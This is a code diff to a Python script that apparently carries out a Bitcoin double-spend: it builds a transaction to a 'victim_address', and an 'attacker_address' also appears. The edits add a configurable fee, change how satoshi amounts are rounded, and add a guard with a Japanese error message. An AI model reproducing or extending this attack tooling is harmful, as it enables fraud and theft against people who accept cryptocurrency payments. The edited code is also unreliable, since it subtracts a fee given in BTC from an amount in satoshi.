@@ -38,9 +38,14 @@ parser.add_argument("--is_testnet",
                     default=True,
                     type=bool)
 
+parser.add_argument("--fee",
+                    help="BTC send fee. (Default=0.00015)",
+                    default=0.00015,
+                    type=float)
+
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
-    return int(btc_amount / satoshi)
+    return round(btc_amount / satoshi)
 
 def broadcast_transaction(raw_tx, testnet):
     url = "https://blockchain.info/pushtx"
@@ -70,9 +75,9 @@ victim_address   = args.victim_address
 attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
+fee        = args.fee
 
 
-fee = 15000
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
 rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
@@ -82,9 +87,12 @@ send_amount = to_satoshi(amount_btc)
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
 
+if send_amount < fee:
+    print("[!] おつり料金が送金量を上回っています。お釣りの設定を見直してください。")
+    exit()
+
 change_address = transaction_util.wiftoaddr(key)
 change_btc_amt = send_amount - fee #おつり
-
 tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
 tx_victim = transaction_util.mktx(inputs, tx_victim)
 tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
